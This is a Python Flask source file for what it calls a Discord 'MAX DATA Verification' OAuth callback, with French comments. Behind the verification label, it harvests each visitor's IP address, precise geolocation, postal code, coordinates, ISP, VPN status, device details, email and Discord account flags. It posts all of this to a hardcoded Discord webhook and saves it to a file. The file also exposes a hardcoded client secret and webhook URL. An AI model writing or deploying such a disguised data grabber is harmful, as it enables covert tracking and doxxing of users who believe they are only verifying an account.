# api/callback.py
from flask import Flask, request, redirect, jsonify
import requests
import json
from datetime import datetime
import traceback
import os

app = Flask(__name__)

# Configuration
CLIENT_ID = "1499869968899244252"
CLIENT_SECRET = "wTHLSMAnD1q05YLbcSZx6jVRr3q3yipq"
REDIRECT_URI = "https://negro-lemon.vercel.app/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1498739271006294016/_4sdyqbsQ6UPC7GP1HPtqnWAf7qPuwCf4G4HYWLVqawxX6iWpHR4kZtpb12W9UJykAT-"
VERIFIED_USERS_FILE = "verified_users.json"

def get_user_ip(request):
    """Récupère l'IP réelle"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_geo_location(ip):
    """Récupère TOUTE la géolocalisation comme avant"""
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=8)
        data = resp.json()
        return {
            "ip": ip,
            "city": data.get('city', 'Unknown'),
            "region": data.get('region', 'Unknown'),
            "region_code": data.get('region_code', 'Unknown'),
            "country": data.get('country_name', 'Unknown'),
            "country_code": data.get('country_code', 'Unknown'),
            "postal": data.get('postal', 'Unknown'),
            "latitude": data.get('latitude', 'Unknown'),
            "longitude": data.get('longitude', 'Unknown'),
            "timezone": data.get('timezone', 'Unknown'),
            "isp": data.get('org', 'Unknown'),
            "asn": data.get('asn', 'Unknown'),
            "vpn": data.get('proxy', False) or data.get('tor', False),
            "proxy": data.get('proxy', False),
            "tor": data.get('tor', False),
            "hosting": data.get('hosting', False),
            "mobile": data.get('mobile', False)
        }
    except Exception as e:
        print(f"Geo error: {e}")
        return {"ip": ip, "error": "Geo unavailable"}

def get_device_info(user_agent):
    """Analyse complète du User-Agent"""
    ua = user_agent.lower()
    
    # OS Detection détaillée
    if "windows 11" in ua:
        os_name = "Windows 11"
    elif "windows 10" in ua:
        os_name = "Windows 10"
    elif "windows" in ua:
        os_name = "Windows"
    elif "mac os" in ua or "macintosh" in ua:
        os_name = "macOS"
    elif "linux" in ua:
        os_name = "Linux"
    elif "android" in ua:
        os_name = "Android"
    elif "iphone" in ua:
        os_name = "iOS (iPhone)"
    elif "ipad" in ua:
        os_name = "iOS (iPad)"
    else:
        os_name = "Unknown"
    
    # Browser Detection
    if "edg" in ua:
        browser = "Edge"
    elif "chrome" in ua and "edg" not in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua and "chrome" not in ua:
        browser = "Safari"
    elif "opera" in ua or "opr" in ua:
        browser = "Opera"
    else:
        browser = "Unknown"
    
    # Device Type
    if "mobile" in ua or "android" in ua or "iphone" in ua:
        device = "Mobile"
    elif "tablet" in ua or "ipad" in ua:
        device = "Tablet"
    else:
        device = "Desktop"
    
    return {
        "raw": user_agent[:200],
        "os": os_name,
        "browser": browser,
        "device": device
    }

def get_discord_badges(flags):
    """Convertit les flags Discord en badges lisibles"""
    badges = []
    badge_map = {
        1 << 0: "Staff",
        1 << 1: "Partner",
        1 << 2: "HypeSquad",
        1 << 3: "Bug Hunter L1",
        1 << 6: "Bravery",
        1 << 7: "Brilliance",
        1 << 8: "Balance",
        1 << 9: "Early Supporter",
        1 << 10: "Team User",
        1 << 12: "Bug Hunter L2",
        1 << 14: "Verified Bot Dev",
        1 << 16: "Active Developer",
        1 << 18: "Moderator Alumni"
    }
    for bit, name in badge_map.items():
        if flags & bit:
            badges.append(name)
    return badges if badges else ["None"]

def get_nitro_type(premium_type):
    """Convertit le type Nitro"""
    types = {0: "None", 1: "Nitro Classic", 2: "Nitro"}
    return types.get(premium_type, "Unknown")

def send_complete_webhook(user_data, geo_info, device_info, user_ip):
    """Envoie TOUTES les données comme avant - Multiple embeds"""
    
    user = user_data.get('user', user_data)
    flags = user.get('flags', 0)
    badges = get_discord_badges(flags)
    nitro = get_nitro_type(user.get('premium_type', 0))
    
    vpn_status = "⚠️ **VPN/PROXY DETECTED**" if geo_info.get('vpn') else "✅ Clean IP"
    
    # ========== EMBED 1 : INFOS UTILISATEUR ==========
    embed1 = {
        "title": "🔐 **VERIFICATION - MAX DATA V2**",
        "color": 0x5865F2,
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {
                "name": "👤 **USER INFORMATION**",
                "value": f"```yaml\n"
                        f"Username: {user.get('username', 'Unknown')}\n"
                        f"Global Name: {user.get('global_name', 'None')}\n"
                        f"User ID: {user.get('id', 'Unknown')}\n"
                        f"Discriminator: {user.get('discriminator', '0')}\n```",
                "inline": False
            },
            {
                "name": "📧 **EMAIL**",
                "value": f"```yaml\n"
                        f"Email: {user.get('email', 'No email')}\n"
                        f"Verified: {user.get('verified', False)}\n```",
                "inline": True
            },
            {
                "name": "🏅 **BADGES & NITRO**",
                "value": f"```yaml\n"
                        f"Badges: {', '.join(badges)}\n"
                        f"Nitro: {nitro}\n"
                        f"MFA: {'Enabled' if user.get('mfa_enabled') else 'Disabled'}\n"
                        f"Locale: {user.get('locale', 'Unknown')}\n```",
                "inline": True
            }
        ],
        "footer": {"text": f"Verified at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
    }
    
    if user.get('avatar'):
        embed1["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png?size=1024"}
    
    # ========== EMBED 2 : LOCALISATION & NETWORK ==========
    embed2 = {
        "title": "🌍 **GEOLOCATION & NETWORK**",
        "color": 0xED4245,
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {
                "name": "📍 **LOCATION**",
                "value": f"```yaml\n"
                        f"IP: {user_ip}\n"
                        f"Country: {geo_info.get('country', 'Unknown')} ({geo_info.get('country_code', '?')})\n"
                        f"City: {geo_info.get('city', 'Unknown')}\n"
                        f"Region: {geo_info.get('region', 'Unknown')}\n"
                        f"Postal: {geo_info.get('postal', 'Unknown')}\n"
                        f"Coordinates: {geo_info.get('latitude', '?')}, {geo_info.get('longitude', '?')}\n"
                        f"Timezone: {geo_info.get('timezone', 'Unknown')}\n```",
                "inline": False
            },
            {
                "name": "🌐 **NETWORK INFO**",
                "value": f"```yaml\n"
                        f"ISP: {geo_info.get('isp', 'Unknown')}\n"
                        f"ASN: {geo_info.get('asn', 'Unknown')}\n"
                        f"Hosting: {'Yes' if geo_info.get('hosting') else 'No'}\n"
                        f"Mobile Network: {'Yes' if geo_info.get('mobile') else 'No'}\n"
                        f"Proxy: {'Yes' if geo_info.get('proxy') else 'No'}\n"
                        f"TOR: {'Yes' if geo_info.get('tor') else 'No'}\n```",
                "inline": True
            },
            {
                "name": "🖥️ **DEVICE INFO**",
                "value": f"```yaml\n"
                        f"OS: {device_info.get('os', 'Unknown')}\n"
                        f"Browser: {device_info.get('browser', 'Unknown')}\n"
                        f"Device: {device_info.get('device', 'Unknown')}\n```",
                "inline": True
            },
            {
                "name": "🛡️ **VPN STATUS**",
                "value": vpn_status,
                "inline": False
            }
        ]
    }
    
    # Envoyer les 2 embeds
    payloads = [
        {"embeds": [embed1], "username": "Verification System V2"},
        {"embeds": [embed2], "username": "Verification System V2"}
    ]
    
    for payload in payloads:
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=10)
        except Exception as e:
            print(f"Webhook error: {e}")

def save_verified_user(user_id, user_data, geo_info, device_info):
    """Sauvegarde complète"""
    try:
        if os.path.exists(VERIFIED_USERS_FILE):
            with open(VERIFIED_USERS_FILE, 'r') as f:
                users = json.load(f)
        else:
            users = {}
        
        users[str(user_id)] = {
            "user_id": user_id,
            "username": user_data.get('username'),
            "verified_at": datetime.now().isoformat(),
            "email": user_data.get('email'),
            "geo": geo_info,
            "device": device_info
        }
        
        with open(VERIFIED_USERS_FILE, 'w') as f:
            json.dump(users, f, indent=2)
        return True
    except Exception as e:
        print(f"Save error: {e}")
        return False

@app.route('/')
def home():
    return jsonify({"status": "online", "service": "MAX DATA Verification"})

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

@app.route('/api/check/<user_id>')
def check_verification(user_id):
    """Vérifie si un user est vérifié"""
    try:
        if os.path.exists(VERIFIED_USERS_FILE):
            with open(VERIFIED_USERS_FILE, 'r') as f:
                users = json.load(f)
            if str(user_id) in users:
                return jsonify({"verified": True, "user_id": user_id})
        return jsonify({"verified": False, "user_id": user_id})
    except:
        return jsonify({"verified": False})

@app.route('/callback')
def callback():
    """Route principale - Version MAX DATA"""
    
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        return redirect("https://guns.lol/j8a?error=oauth_failed")
    if not code:
        return redirect("https://guns.lol/j8a?error=no_code")
    
    # Récupérer TOUTES les infos
    user_ip = get_user_ip(request)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    geo_info = get_geo_location(user_ip)
    device_info = get_device_info(user_agent)
    
    print(f"\n{'='*50}")
    print(f"📊 Nouvelle vérification - IP: {user_ip}")
    print(f"📍 {geo_info.get('city')}, {geo_info.get('country')}")
    print(f"🛡️ VPN: {geo_info.get('vpn')}")
    print(f"{'='*50}\n")
    
    try:
        # Échanger le code contre un token
        token_response = requests.post(
            "https://discord.com/api/oauth2/token",
            data={
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": REDIRECT_URI
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15
        )
        
        token_data = token_response.json()
        access_token = token_data.get('access_token')
        
        if not access_token:
            return redirect("https://guns.lol/j8a?error=token_failed")
        
        # Récupérer les infos Discord
        user_response = requests.get(
            "https://discord.com/api/users/@me",
            headers={"Authorization": f"Bearer {access_token}"},
            timeout=10
        )
        
        user_data = user_response.json()
        user_id = user_data.get('id')
        
        if user_id:
            # Sauvegarde complète
            save_verified_user(user_id, user_data, geo_info, device_info)
            
            # Envoyer au webhook avec TOUTES les données
            send_complete_webhook(user_data, geo_info, device_info, user_ip)
            
            print(f"✅ Vérifié: {user_data.get('username')} ({user_id})")
        
        return redirect("https://guns.lol/j8a?verified=true&mode=MAX_DATA")
        
    except Exception as e:
        print(f"❌ Erreur: {e}")
        print(traceback.format_exc())
        return redirect("https://guns.lol/j8a?error=unknown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
